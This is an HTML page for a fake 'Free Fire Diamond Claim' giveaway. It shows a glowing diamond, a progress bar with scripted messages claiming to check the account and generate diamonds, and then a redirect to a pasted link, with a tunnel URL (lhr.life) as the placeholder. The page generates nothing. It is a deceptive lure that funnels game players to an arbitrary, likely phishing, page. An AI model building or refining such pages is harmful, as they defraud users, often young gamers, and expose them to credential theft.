<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Free Fire Diamond Claim</title>

<style>
body {
  margin: 0;
  height: 100vh;
  display: flex;
  justify-content: center;
  align-items: center;
  background: black;
  font-family: Arial;
  color: white;
}

.card {
  text-align: center;
  background: rgba(255,255,255,0.05);
  padding: 30px;
  border-radius: 20px;
  width: 320px;
  box-shadow: 0 0 30px rgba(0,0,0,0.8);
}

h1 {
  margin-bottom: 5px;
}

/* glowing diamond */
.diamond {
  font-size: 60px;
  animation: glow 1.5s infinite alternate;
}

@keyframes glow {
  from { text-shadow: 0 0 10px cyan; }
  to { text-shadow: 0 0 30px blue; }
}

/* loading bar */
.progress {
  width: 100%;
  height: 8px;
  background: #333;
  border-radius: 10px;
  overflow: hidden;
  margin: 15px 0;
}

.bar {
  height: 100%;
  width: 0%;
  background: linear-gradient(90deg, cyan, blue);
}

/* button */
button {
  background: cyan;
  border: none;
  padding: 12px 20px;
  border-radius: 10px;
  font-size: 16px;
  cursor: pointer;
}

button:hover {
  background: blue;
  color: white;
}

input {
  width: 100%;
  padding: 10px;
  border-radius: 10px;
  border: none;
  margin-top: 10px;
}

.status {
  font-size: 14px;
  margin-top: 10px;
  color: lightgreen;
}
</style>
</head>

<body>

<div class="card">
  <h1>💎 Free Fire</h1>
  <p>Diamond Claim System</p>

  <div class="diamond">💎</div>

  <input type="text" id="link" placeholder="https://18afed78b11adc.lhr.life">

  <button onclick="start()">Claim Now</button>

  <div class="progress">
    <div class="bar" id="bar"></div>
  </div>

  <div class="status" id="status"></div>
</div>

<script>
function start() {
  let link = document.getElementById("link").value;

  if(link === "") {
    alert("Paste link first!");
    return;
  }

  let bar = document.getElementById("bar");
  let status = document.getElementById("status");

  let width = 0;

  let steps = [
    "Connecting to server...",
    "Checking account...",
    "Generating diamonds...",
    "Finalizing..."
  ];

  let i = 0;

  let interval = setInterval(() => {
    width += 5;
    bar.style.width = width + "%";

    if(width % 25 === 0 && i < steps.length) {
      status.innerText = steps[i];
      i++;
    }

    if(width >= 100) {
      clearInterval(interval);
      status.innerText = "Success! Redirecting...";
      setTimeout(() => {
        window.location.href = link;
      }, 1500);
    }

  }, 200);
}
</script>

</body>
</html>
